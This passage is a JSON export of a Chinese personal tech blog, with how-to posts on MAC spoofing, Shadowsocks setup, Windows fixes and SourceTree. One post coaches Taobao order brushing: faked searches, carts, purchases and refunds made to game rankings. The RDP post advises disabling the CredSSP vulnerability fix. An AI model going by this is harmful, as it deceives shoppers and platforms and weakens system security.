www.jb51.net/article/109349.htm","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"网卡地址修改工具软件：TMAC","slug":"software-network-address-editor-tmac","date":"2018-10-29T08:26:14.000Z","updated":"2018-10-29T08:26:14.000Z","comments":true,"path":"software-network-address-editor-tmac.html","permalink":"https://sobaigu.com/software-network-address-editor-tmac.html","excerpt":"","text":"基本信息 程序类型：安装版 界面语言：英文 文件大小：2 m 支持系统：Windows 官方主页：download.cnet.com/networking-network-tools/windows/ 软件介绍 一款在Windows下可以修改/伪造 MAC 的工具，简称TMAC。完美支持 WIN 7/Win 8/Win 8.1/Win 10。Technitium MAC Address Changer 可一键修改有线网卡、无线网卡的 MAC 地址，无需复杂设置,软件界面如下： 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 官方下载 BitTorrent Sync 提取码 使用方法 安装并打开软件 选中 Network connections 中需要修改的网卡名 点 Random MAC Address 生成随机 MAC 地址 点 “change now!” 修改网卡 MAC 地址 注意：修改 MAC 地址会断一下网络。 其他修改电脑网卡地址的方法可见：Windows 10 系统修改网卡地址『MAC』","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"}]},{"title":"各大搜索引擎蜘蛛名称『转』","slug":"search-engine-names-for-seo","date":"2018-10-24T09:27:48.000Z","updated":"2018-10-24T09:27:48.000Z","comments":true,"path":"search-engine-names-for-seo.html","permalink":"https://sobaigu.com/search-engine-names-for-seo.html","excerpt":"","text":"最新整理的蜘蛛爬虫机器人名称列表见：最新搜索引擎蜘蛛机器人User Agent名称 前言 最近有个项目需要研究SEO，基本有了方向，收集些资料，以便后续使用。转的别人的成果，不知道这些搜索引擎爬虫特征正确率几何，有待后续验证。 百度蜘蛛：Baiduspider 网上的资料百度蜘蛛名称有BaiduSpider、baiduspider等，都洗洗睡吧，那是旧黄历了。百度蜘蛛最新名称为Baiduspider。日志中还发现了Baiduspider-image这个百度旗下蜘蛛，查了下资料（其实直接看名字就可以了……），是抓取图片的蜘蛛。 常见百度旗下同类型蜘蛛还有下面这些：Baiduspider-mobile（抓取wap）、Baiduspider-image（抓取图片）、Baiduspider-video（抓取视频）、Baiduspider-news（抓取新闻）。 注：以上百度蜘蛛目前常见的是Baiduspider和Baiduspider-image两种。 谷歌蜘蛛：Googlebot 这个争议较少，但也有说是GoogleBot的。谷歌蜘蛛最新名称为compatible; Googlebot/2.1;。还发现了Googlebot-Mobile，看名字是抓取wap内容的。 360蜘蛛：360Spider 它是一个很“勤奋抓爬”的蜘蛛。 雅虎蜘蛛：Yahoo! Slurp China或者Yahoo! 名称中带Slurp和空格，名称有空格robots里名称可以使用Slurp或者Yahoo单词描述，不知道有效无效。 有道蜘蛛：YoudaoBot，YodaoBot 两个名字都有，中文拼音少了个U字母读音差别很大嘎，这都会少 搜狗蜘蛛：Sogou News Spider 搜狗蜘蛛还包括如下这些：Sogou web spider、Sogou inst spider、Sogou spider2、Sogou blog、Sogou News Spider、Sogou Orion spider， （参考一些网站的robots文件，搜狗蜘蛛名称可以用Sogou概括，无法验证不知道有没有效） 看看最权威的百度的robots.txt ，http://www.baidu.com/robots.txt 就为Sogou搜狗蜘蛛费了不少字节，占了一大块领地。 Sogou web spider；Sogou inst spider；Sogou spider2；Sogou blog；Sogou News Spider；Sogou Orion spider目前6个，名称都带空格。 线上常见Sogou web spider/4.0 ；Sogou News Spider/4.0 ；Sogou inst spider/4.0 可以为它颁个“占名为王”奖。 必应蜘蛛：bingbot 线上(compatible; bingbot/2.0;) 其他基本残废的小蜘蛛 MSN蜘蛛：msnbot，msnbot-media，只见到msnbot-media在狂爬…… 一搜蜘蛛：YisouSpider Alexa蜘蛛：ia_archiver 宜sou蜘蛛：EasouSpider 即刻蜘蛛：JikeSpider 一淘网蜘蛛：EtaoSpider Mozilla/5.0 (compatible; EtaoSpider/1.0; http://省略/EtaoSpider) 根据上述蜘蛛中选择几个常用的允许抓取，其余的都可以通过robots屏蔽抓取。如果你暂时空间流量还足够使用，等流量紧张了就保留几个常用的屏蔽掉其它蜘蛛以节省流量。至于那些蜘蛛抓取对网站能带来有利用的价值，网站的管理者眼睛是雪亮的。 另外还发现了如 YandexBot、AhrefsBot和ezooms.bot这些蜘蛛，据说这些蜘蛛国外噶，对中文网站用处很小。那不如就节省下资源。 原文出处处：https://blog.csdn.net/RSS_40728440/article/details/79174157","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"取消农行短信通知的图文教程","slug":"quxiao-nonghang-duanxin-tongzhi","date":"2018-09-29T13:23:31.000Z","updated":"2018-09-29T13:23:31.000Z","comments":true,"path":"quxiao-nonghang-duanxin-tongzhi.html","permalink":"https://sobaigu.com/quxiao-nonghang-duanxin-tongzhi.html","excerpt":"","text":"前言 这是篇给父老乡亲看的教程，有些操作可能不难，但某些软件的功能确实做得跟屎一样，让人不好下手。尤其是大名鼎鼎的农业银行，这个奇葩的大国企，网站做得烂，客户端也从来都是一星评级！ 本来老人家只在想方便在手机上查个帐什么的，结果去银行换个手机号，居然连带把短信通知开了，关键是每月都要交钱。联系了95599，给了条短信，本以为老人家照做就是了，可照短信提示在手机客户端上根本没对上，也是服气。 不得已，在自己手机上装了个烂手机端，做个图文教程方便老人家照着做。 操作步骤 步骤一：找消息服务 对于这种躺着爆赚的业务，大抵银行是不让你能轻易取消的，所以藏得比较深。 打开手机客户端首页，在靠近顶部有个 ＋ 全部，点进去显示所有服务。 翻动屏幕到最后，终于看到个 消息服务 步骤二：查询/注销消息服务 找到消息服务点进去，将显示相关操作项。此处我们可以查询和注销消息服务，点 注销 将将账号下对应的卡的短信通知服务取消。","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"江湖","slug":"江湖","permalink":"https://sobaigu.com/tags/%E6%B1%9F%E6%B9%96/"}]},{"title":"Windows 10 系统修改网卡地址『MAC』","slug":"windows-10-modify-mac","date":"2018-08-19T14:00:10.000Z","updated":"2018-08-19T14:00:10.000Z","comments":true,"path":"windows-10-modify-mac.html","permalink":"https://sobaigu.com/windows-10-modify-mac.html","excerpt":"前言 总有一些特殊的需求，需要更改计算机网卡地址，如某软件提示怀疑商用，如自己的MAC已经暴露，这个时候改MAC地址就可以了。","text":"前言 总有一些特殊的需求，需要更改计算机网卡地址，如某软件提示怀疑商用，如自己的MAC已经暴露，这个时候改MAC地址就可以了。 方法 使用工具修改 工具其实也是修改的注册表，对于小白来说简单方便也不会出错，推荐使用。 在Windows XP时代这种工具遍地都是，现在做这种工具的逐渐少了，不过有一款还是值得推荐：Technitium MAC Address Changer ，软件是免费的，别信那些所谓的破解！ 这个软件所有的功能都在界面上，教程也是没有必要的，软件下载地址 在网卡高级属性中直接修改 在系统网卡属性中有网卡地址选项的情况下，不用工具的推荐就用这种方法，别人做了详细的图文教程，就不再费事了。 链接在此，自己去看：https://www.ithome.com/html/win10/244510.htm 注册表修改 看不懂的别尝试了，贴出来只是告诉想折腾的人，路径在这里让你好找。 123456Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\&#123;4d36e972-e325-11ce-bfc1-08002be10318&#125;\\0002]&quot;NetType&quot;=&quot;WLAN&quot;&quot;NetworkAddress&quot;=&quot;028D88ff6588&quot;&quot;DriverDesc&quot;=&quot;Intel(R) Dual Band Wireless-AC 8265&quot;","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"解决CentOS7防火墙故障导致端口不通","slug":"CentOS-firewall-with-port-issue","date":"2018-06-01T10:36:07.000Z","updated":"2018-06-01T10:36:07.000Z","comments":true,"path":"CentOS-firewall-with-port-issue.html","permalink":"https://sobaigu.com/CentOS-firewall-with-port-issue.html","excerpt":"","text":"前言 有个哥们跑来问，为啥网站500错误了？ 对于这种问题，当然要说是你服务器的问题了。登上他的服务器去看了下，也确实是服务器上的配置不对，哥们配了个ssl搞得乱七八糟。 一时兴起说帮你整理下，然而……过程囧的是各种端口不通，本来预计10分钟搞定的事搞了一下午！ 问题原因 折腾了一下午，最终发现是防火墙的问题！ 可是明明是防火墙未启用状态，为啥会有这个问题？之前也不是自己搞的，当时也看防火墙没启用，一直以为是linode服务器像阿里云那样外面还有个防火墙安全设置，找了一圈也没有，差点就以为是这个服务器被墙给关照了，或者端口被白名单到只剩下个22端口玩了。 无意间想干脆把防火墙启动起来看下吧，结果： 123systemctl start firewalld.service#报了下面的错误Failed to start firewalld.service: Unit firewalld.service is masked. 解决方法 不知道这种错误什么意思，再随手敲入以下命令： 1systemctl unmask firewalld.service 这个命令过后，防火墙能正常启动了，看了防火墙规则里也并没有放行什么端口 12firewall-cmd --list-portsfirewall-cmd --list-all 没规则那么我们就加规则： 12345firewall-cmd --permanent --zone=public --add-port=80/tcp#重载或者重启防火墙让规则生效firewall-cmd --reload#重启防火墙服务当前连接会断开systemctl restart firewalld.service 重启防火墙后，端口顺利连通。 最后想说，linode服务器真不咋的，网络也不快，性能也不算好，贵得真是没什么道理。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Windows服务器上安装Shadowsocks服务端","slug":"ssserver-in-windows","date":"2018-05-20T12:48:56.000Z","updated":"2018-05-20T12:48:56.000Z","comments":true,"path":"ssserver-in-windows.html","permalink":"https://sobaigu.com/ssserver-in-windows.html","excerpt":"","text":"前言 首先，不建议大家在服务器上使用Windows系统。不是说Windows server不好，作为服务器常年不关机来说，Windows确实是逊Linux一筹，服务器配置越烂开机时间越长体现得越明显。 本人手上有个Windows服务器，阿里云的，配置是最基础的，当初搞活动便宜3年的价格，偶尔要挂个淘宝客户端，所以用了Windows server 2008系统。远程桌面操作的时候体验挺差的，尤其是启动了千牛客户端程序后CPU狂飙，然后就被阿里云限制CPU恶性循环，所以在服务器上装个Shadowsocks服务端，另开个本地机器使用代理用千牛。 准备工作 Windows系统下装Shadowsocks服务端没有Linux那么方便，可选的版本也就只有 原版Shadowsocks，python语言 和 libQtShadowsocks版 ，他们都好久不更新了，这里介绍原版。 我们需要安装准备以下环境： python 根据自己的系统下载对应位数版本，建议是python 2.7 安装的时候注意勾选将其添加到环境变量，要不然一会儿还要手动将python加入系统环境变量中 OpenSSL 同样根据自己的系统下载对应版本，建议下载v1.0.2 light 安装的时候选择将lib库文件安装到系统目录，这样就不用设置系统环境变量就能找到OpenSSL的动态库了 最新版本释放的lib库文件加了后缀的，外部程序去用找不到，需要自己找到文件将文件名中的数字版本去掉 OpenSSL 需要 Visual C++ 2008 Redistributables 支持，如系统中未安装请到此下载并自行安装好相应的依赖。 以上两个依赖环境请自行安装好，没什么好说的，下载安装程序一步步安装就可以了。 需要注意的是，请下载版本的时候选择相同的位数版本，不能32位和64位程序混用。 配置系统环境变量 如果以上安装你没有勾选添加到系统环境变量，那么你需要按以下方法将其添加到系统环境变量，以便第三方程序能够自动找到相应的依赖程序。 在 我的电脑上右键》属性 ，左边导航格可见：高级系统设置，点进去 右下角可见个 环境变量 ，点进去，在 用户变量 或者 系统变量 中添加 path 都可以，建议在 系统变量 中添加 找到 path 这个变量，双击或者点 编辑 都可以，添加如：C:\\Python27\\;C:\\Python27\\Scripts;C:\\OpenSSL-Win32\\bin; ，和其他已有值用英文逗号区隔，请注意自己的实际路径 安装 Shadowsocks 以上环境安装准备完成后，就剩下安装Shadowsocks了，方法如下： 打开 cmd（Windows Server 2012 R2 系统可按 Windows 图标+X+A打开管理员权限的命令提示符） cd C:\\Python27\\Scripts 进入 Python 目录 输入 pip install shadowsocks 即可安装Shadowsocks服务端，看提示即可 修复bug 前面说了Windows下的服务端可选择的少，已有的版本也n年没人维护了，总会留下些bug无法使用。 刚才pip安装的Shadowsocks服务端启动入口程序在 cd C:\\Python27\\Scripts 目录下『怎么改其他目录我也不知道』，直接启动的话将提示类似这样的错误： 1undefined symbol: EVP_CIPHER_CTX_cleanup 这是因为OpenSSL的函数变了，我们需要对Shadowsocks的源码进行更改，找到 python2.7/dist-packages/shadowsocks/crypto/openssl.py 这个文件，找到下面两个函数： 12libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)libcrypto.EVP_CIPHER_CTX_cleanup 可以使用查找替换的方法将其改成 EVP_CIPHER_CTX_reset ： 12libcrypto.EVP_CIPHER_CTX_reset.argtypes = (c_void_p,)libcrypto.EVP_CIPHER_CTX_reset 如果你想使用新奇的加密方式，那你可能会遇到更多的错误，其实是需要安装对应的扩展支持插件。没什么屌事就老老实实用默认的加解密方法吧，你的数据并不需要多安全的保护。 启动 需要用命令启动 Shadowsocks，格式如： 1ssserver.exe -p 443 -k password -m aes-256-cfb 也可以建个配置文件，然后导入配置文件的形式启动，如配置文件为 C:\\Python27\\Scripts\\config.json ，其内容如下： 12345678910&#123; &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;server_port&quot;:443, &quot;local_address&quot;:&quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;password&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;fast_open&quot;: false&#125; 然后通过以下命令启动： 1ssserver.exe -c C:\\Python27\\Scripts\\config.json 记得在防火墙将用到的端口开放入站访问。为了每次启动方便，我们可以建快捷方式或者弄个批处理放桌面上，或者放进系统启动项： 12345@ECHO OFFCD C:\\Python27\\Scriptsrem ssserver.exe -c config.jsonssserver.exe -p 443 -k password -m aes-256-cfbPAUSE 要停止Shadowsocks服务时关掉启动窗口即可。 参考文档 https://github.com/shadowsocks/shadowsocks/issues/646","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"Windows 10 home 版启用组策略编辑器","slug":"windows-home-version-gpedit","date":"2018-05-14T12:27:37.000Z","updated":"2018-05-14T12:27:37.000Z","comments":true,"path":"windows-home-version-gpedit.html","permalink":"https://sobaigu.com/windows-home-version-gpedit.html","excerpt":"折腾系统设置时经常会用到注册表编辑器和组策略编辑器，两种工具其实设置的效果是相同的，最后都是改的系统注册表。 相比注册表编辑器，组策略编辑器会对很多功能有说明，将设置界面化，相对来说不容易改错。但Win10家庭版是没有组策略编辑器功能的，所以往往只能修改注册表来实现某些操作。 那么Win10家庭版是否也能开启组策略编辑器功能呢？","text":"折腾系统设置时经常会用到注册表编辑器和组策略编辑器，两种工具其实设置的效果是相同的，最后都是改的系统注册表。 相比注册表编辑器，组策略编辑器会对很多功能有说明，将设置界面化，相对来说不容易改错。但Win10家庭版是没有组策略编辑器功能的，所以往往只能修改注册表来实现某些操作。 那么Win10家庭版是否也能开启组策略编辑器功能呢？ 答案是肯定的！ Win10家庭版虽然是初级的Windows10版本，但是也包括Win10专业版等高级版本的功能组件，只不过是没有启用而已，我们通过命令是可以开启其中的某些功能的，例如组策略编辑器功能。 123456@echo offpushd &quot;%~dp0&quot;dir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txtdir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txtfor /f %%i in (&#x27;findstr /i . List.txt 2^&gt;nul&#x27;) do dism /online /norestart /add-package:&quot;C:\\Windows\\servicing\\Packages\\%%i&quot;pause 以上代码为命令行内容，将其复制保存为 .cmd 或者 .bat 文件，右键点击该文件，选择 以管理员身份运行 即可。 运行以后，你再在 运行 窗口或者Cornata小娜搜索框中输入 gpedit.msc ，就能够打开组策略编辑器了。 当然，你也可以采用其他方法启用专业版的功能，如使用专业版密钥激活系统，从其他系统拷贝执行程序等，请自行研究。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Windows远程桌面出现身份验证错误：要求的函数不受支持","slug":"windows-mstsc-credssp-not-support","date":"2018-05-10T05:51:41.000Z","updated":"2018-05-10T05:51:41.000Z","comments":true,"path":"windows-mstsc-credssp-not-support.html","permalink":"https://sobaigu.com/windows-mstsc-credssp-not-support.html","excerpt":"","text":"问题现象 用得好好的桌面远程，一早开机去连接，居然连接失败，提示： 远程桌面发生身份验证错误，要求的函数不受支持 如果是英文版系统，那可能提示是这样的： An authentication error has occurred and the required function is not supported 本以为是服务器开太久了，可用其他远程工具登上去发现服务器好好的，并没有什么异常，查了下居然是本地系统的问题。 起因 因为前一天都好好的，服务器也没变化，本地机器昨夜也是自动重启了，看了下系统更新的系统补丁安装记录，总共两个补丁，一个是adobe的，另外一个点击去看介绍，果然是有嫌疑的。 补丁记录：适用于 Windows 10 version 1709 的 05 累积更新，适合基于 x64 的系统(kb4103727) 补丁介绍：https://support.microsoft.com/zh-cn/help/4103727/windows-10-update-kb4103727 1Addresses an issue that may cause an error when connecting to a Remote Desktop server. For more information, see CredSSP updates for CVE-2018-0886. 微软的补丁更新记录 2018 年 4 月 17 日 KB4093120 中的远程桌面客户端 (RDP) 更新将增强更新的客户端无法连接到尚未更新的服务器时出现的错误消息。 2018 年 5 月 8 日 将默认设置从“易受攻击”更改为“缓解”的更新。 相关的 Microsoft 知识库编号已在 CVE-2018-0886 中列出。 解决办法 方法1：更改服务器远程桌面设置 之前为了安全，服务器远程桌面设置为： 1只允许运行带网络级身份验证的远程桌面的计算机连接(更安全) 用上去也没有所谓的安全，干脆直接改成： 1允许运行任意版本远程桌面的计算机(较不安全) 在能够远程的计算机上远程到服务器『我这是系统里装了teamviewer，开机自启动，平常用不到，这次刚好用到』：在我的电脑上右键》属性》远程设置》远程，然后就看到了，改完就能用任意远程桌面客户端远程连接了。 方法2：修改本地组策略 在需要远程控制的客户机上：开始》运行『或用win+R快捷键直接就出来了』》输入gpedit.msc回车打开组策略编辑器，计算机配置》管理模板》系统》凭据分配》加密Oracle修正，选择 启用 并选择 易受攻击，确定保存设置。 易受攻击– 使用 CredSSP 的客户端应用程序将通过支持回退到不安全的版本使远程服务器遭受攻击，但使用 CredSSP 的服务将接受未修补的客户端。 如果是家庭版系统，默认是没有组策略编辑器的，请按照此方法启用组策略编辑器，或者直接请看下一种方法，这个方法不适合家庭版系统。 英文版系统 Group Policy -&gt; Computer Configuration -&gt; Administrative Templates -&gt; System -&gt; Credentials Delegation&gt; Encrypted Oracle Remediation change to Vulnerable Vulnerable – Client applications that use CredSSP will expose the remote servers to attacks by supporting fallback to insecure versions, and services that use CredSSP will accept unpatched clients. 方法3：卸载补丁 在家庭版系统中，你可能发现在组策略中并没有 加密Oracle修正 这项，这个时候要么去服务器上同样装系统更新，要么将自己电脑上的补丁卸载掉：开始》设置》更新和安全》查看已安装更新历史记录》卸载更新，找到 kb4103727 这个补丁卸载重启电脑即可。 据说Windows7上是KB4103718（适用于基于 x64 的系统的 Windows 7 月度安全质量汇总），大同小异，卸载后重启即可正常登录 参考文档 https://support.microsoft.com/zh-cn/help/4093492/credssp-updates-for-cve-2018-0886-march-13-2018","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"同花顺报0x80000003错误","slug":"network-error-publickey-0x80000003","date":"2018-05-07T13:02:21.000Z","updated":"2018-05-07T13:02:21.000Z","comments":true,"path":"network-error-publickey-0x80000003.html","permalink":"https://sobaigu.com/network-error-publickey-0x80000003.html","excerpt":"同花顺是个好软件，因为支持多券商，在15年开了n个账号，虽然用得不多，但也不想多装一个APP，一些功能如：盈亏统计，监控提醒都让人爱之不舍。 但是，也不得不提，其免费软件的一些易用性或者说可用性总有些小瑕疵，这么多年也一直保留着，也不知道是不是要逼大家去买付费版。","text":"同花顺是个好软件，因为支持多券商，在15年开了n个账号，虽然用得不多，但也不想多装一个APP，一些功能如：盈亏统计，监控提醒都让人爱之不舍。 但是，也不得不提，其免费软件的一些易用性或者说可用性总有些小瑕疵，这么多年也一直保留着，也不知道是不是要逼大家去买付费版。 网站上有个领航版，也是个免费版，界面跟标准免费版有点小差异，功能大同小异，装了后发现登录错误，错误提示如下： 如果同花顺免费版出现问题，基本上是要自己处理的，论坛就是个垃圾场，根本不会有有价值的信息。 这个错误提示是网络设置有问题，可同样的环境下其标准版没什么问题，但问题确实是用了SSR代理导致，在登录时将代理取消或者退出，或者使用直连或启用全局代理都没问题，就是不能使用PAC模式，然后再启动代理就没问题了。具体操作方法可以参考下这里的图示 而且，该问题如果使用SS的代理程序也不会有问题，差别的就是SS代理规则和SSR稍有差异，但理论上也不应该有此问题。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"淘宝商家互助常见类型简介","slug":"commerce-taobao-shuake-faq","date":"2018-05-01T06:23:07.000Z","updated":"2018-05-26T06:23:07.000Z","comments":true,"path":"commerce-taobao-shuake-faq.html","permalink":"https://sobaigu.com/commerce-taobao-shuake-faq.html","excerpt":"","text":"话说在前 这是个对常见问题的整理页，并不会深入探讨怎么做，基本上只针对小白，把一些基本的步骤展示出来，方便第一次做任务的朋友熟悉操作方法。 有一些互助任务，不是商家发布出来谁都可以做的，对账号有相关的门槛，甚至有些还得看缘分，所以做任务前请仔细阅读任务要求，做了很多操作最后无法完成也别气馁，再接再厉下次机会也许就展现在你面前。 互助任务类型 搜索关键词：商家一般会给定关键词范围，通过APP搜索相关词，然后找到商家的商品的过程 收藏/加购物车：收藏指定商品或者店铺，或者将宝贝添加到自己的购物车，以便下次购买 退款单：正常的购物流程，够买付款后，发起退款处理 猜你喜欢：这个是缘分任务，需要自己跟宝贝标签匹配，电商平台认为你会喜欢的宝贝展现在你的面前，所以这个任务佣金较高但机会不是人人有 分享朋友圈：按商家要求将商品或者店铺分享到微信，QQ等朋友圈，以增加商家曝光率 PS：所有的任务都希望是模仿一个正常的购物流程，所以浏览同类商品数个，正常速度翻阅商品详情这种基本条件就不需要强调了，做任务的时候这些是要做的基本行为。 猜你喜欢 这是个缘分任务，跟你的平时行为有关，大致如下： 是否搜索过相关宝贝关键词 是否浏览过相关宝贝，是否在一段时间内持续关注过同类宝贝 是否有相关宝贝收藏或者加购物车的行为 是否有同类商品的购买记录 这个任务实际上是个搜索、收藏加购、下单任务的综合后续回馈，所以在做其他任务时请务必按自己正常的购物习惯操作，习惯越好质量越高，后面可做的任务也越多。 猜你喜欢操作步骤 步骤1：搜索商家提供的关键词，搜索出来的结果中浏览其他人的商品2至5个，看到任务商家的宝贝不要去点 步骤2：手机淘宝首页左下角的 淘 字按钮点一下即可跳转到 猜你喜欢 位置，下方商品中去找任务商家的宝贝。 如果没有找到可以点下左下角的火箭图标回到首页顶部，再下拉『手指下滑操作』刷新首页，再重复步骤2去猜你喜欢位置找 平常的购买、搜索和浏览宝贝等行为对猜你喜欢有影响，所以如果要做某个宝贝，就多去搜对应的关键词，多浏览相关宝贝，将店铺或者店铺内宝贝收藏，过不了半天基本上都能在猜你喜欢栏目有发现。 步骤3：在 猜你喜欢 下找到任务商家的宝贝的话就可以截图去找商家了，一直找不到说明该任务与你无缘，请重复以上步骤继续试试，让淘宝认为你喜欢该商品为止。 搜索关键词 简单任务，任务上家一般会给定几个关键词，搜索后在搜出来的结果中按要求浏览宝贝即可。 收藏加购 一般是和搜索宝贝的后续，要不然怎么知道收藏啥不是？货比三家查找宝贝后，将其添加到购物车或者收藏，一般会要求放一段时间，后续还有下单任务可以做。 退款单 下单后发起退款，退款原因一般选协商一致，稍后再买等。 问答评价 不是人人有机会，一般是购买商品后，淘宝推送的，如果接到了可找商家要任务，按要求回答即可。 怎么提高任务成功率？ 使用正常购物行为 如果是自己买东西，你那一定是搜索自己要的宝贝，然后货比三家，反反复复看商品详情细节，最后选自己要的放进购物车，或先收藏再购买成交。我们在做任务时如果也这样，基本上就会被淘宝认为是正常行为，也会正常推荐商品给你，这样的账号会形成良性循环，任务成功率会越来越高。 给自己打标签 可能你的账号属于宝妈号，平常奶粉尿布什么的买得多，任务商品一开始与你的属性不匹配怎么办？ 那我们就手动给自己打标签： 搜索任务商品关键词，反复浏览查看任务宝贝相关宝贝，包括商品详情，几次之后系统就该认为你可能想买这类商品了 隔一段时间再去操作上面的步骤 将任务商品或者类似商品添加进收藏或者购物车 购买任务商品单『这就是有退款单任务的由来』","categories":[{"name":"混X圈","slug":"混X圈","permalink":"https://sobaigu.com/categories/%E6%B7%B7X%E5%9C%88/"}],"tags":[{"name":"淘宝","slug":"淘宝","permalink":"https://sobaigu.com/tags/%E6%B7%98%E5%AE%9D/"},{"name":"网赚","slug":"网赚","permalink":"https://sobaigu.com/tags/%E7%BD%91%E8%B5%9A/"},{"name":"刷单","slug":"刷单","permalink":"https://sobaigu.com/tags/%E5%88%B7%E5%8D%95/"}]},{"title":"从Google Play Store下载apk安装包","slug":"how-to-download-apk-from-google-play","date":"2018-04-22T09:04:46.000Z","updated":"2018-04-22T09:04:46.000Z","comments":true,"path":"how-to-download-apk-from-google-play.html","permalink":"https://sobaigu.com/how-to-download-apk-from-google-play.html","excerpt":"","text":"前言 给亲朋好友分享梯子的后台加了个在线沟通工具，为了能及时等到消息，本想在手机上装个APP，可这个APP只能在Google Play安装。 去找了官方客服，得到答复是除了APP Store还没有第二条分发途径，o(╯□╰)o 解决办法 众所周知的原因，我们要用Google Play安装软件几乎是不可能的。 基于特殊原因，国内的手机上都装了手机厂商自己的APP Store，但是一些国外的软件则相对缺乏，虽然可以自己翻墙去装Google Play Store，但为了装某个软件去装另外一个不可用的APP，着实是折腾。 其实，我们可以通过其他途径去下载Google Play Store里的apk安装包. 简单的实现途径 通过第三方功能，将Google Play Store里的apk下载到本地，推荐以下两个网站： https://apkpure.com/cn/ https://apps.evozi.com/apk-downloader/ 以上两个网站的作用都是下载apk安装包，然后你就可以在手机上用apk安装了。他们的使用方法是一样的，比如我要装上图中的软件，复制Google Play页面地址：https://play.google.com/Store/apps/details?id=im.crisp.app ，然后粘贴到网站搜索框中搜索下载即可。 当然，以上两个网站下载得到的apk版本可能不太一样，根据自己的需求去选择，或者都去下载对比下即可。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"}]},{"title":"跳过sourcetree初始化账号登录的方法","slug":"skip-account-for-sourcetree-init","date":"2018-04-20T06:46:34.000Z","updated":"2018-04-20T06:46:34.000Z","comments":true,"path":"skip-account-for-sourcetree-init.html","permalink":"https://sobaigu.com/skip-account-for-sourcetree-init.html","excerpt":"SourceTree 虽然是免费授权，但安装之后需要强制使用账号登陆授权以后才可以使用。 很多时候，也不知道是什么原因，登陆经常会失败，爬梯子后使用Google等账号登录也不行，这里就分享一下跳过这个初始化的步骤。","text":"SourceTree 虽然是免费授权，但安装之后需要强制使用账号登陆授权以后才可以使用。 很多时候，也不知道是什么原因，登陆经常会失败，爬梯子后使用Google等账号登录也不行，这里就分享一下跳过这个初始化的步骤。 免登录跳过初始设置的方法 首先，安装完 SourceTree 以后先运行一次，弹出初始化登录页面后退出。 在运行或者打开 我的电脑 资源管理器，在最上方的地址栏直接输入以下地址： 1%LocalAppData%\\Atlassian\\SourceTree\\ 在这个目录下新建一个名为 accounts.json 的文件, 其内容如下： [ &#123; &quot;$id&quot;: &quot;1&quot;, &quot;$type&quot;: &quot;SourceTree.Api.Host.Identity.Model.IdentityAccount, SourceTree.Api.Host.Identity&quot;, &quot;Authenticate&quot;: true, &quot;HostInstance&quot;: &#123; &quot;$id&quot;: &quot;2&quot;, &quot;$type&quot;: &quot;SourceTree.Host.Atlassianaccount.AtlassianAccountInstance, SourceTree.Host.AtlassianAccount&quot;, &quot;Host&quot;: &#123; &quot;$id&quot;: &quot;3&quot;, &quot;$type&quot;: &quot;SourceTree.Host.Atlassianaccount.AtlassianAccountHost, SourceTree.Host.AtlassianAccount&quot;, &quot;Id&quot;: &quot;atlassian account&quot; &#125;, 